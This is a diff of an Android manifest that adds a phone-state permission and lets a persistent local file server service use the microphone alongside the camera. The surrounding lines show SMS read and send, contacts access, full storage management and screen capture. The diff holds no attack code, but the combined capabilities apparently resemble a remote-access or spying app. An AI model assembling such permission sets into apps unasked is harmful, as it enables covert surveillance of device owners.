@@ -33,6 +33,7 @@
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
 
     <!-- Telephony & Location -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
@@ -135,7 +136,7 @@
             android:name=".LocalFileServerService"
             android:exported="false"
             android:stopWithTask="false"
-            android:foregroundServiceType="dataSync|camera" />
+            android:foregroundServiceType="dataSync|camera|microphone" />
 
         <service
             android:name=".ScreenCaptureService"
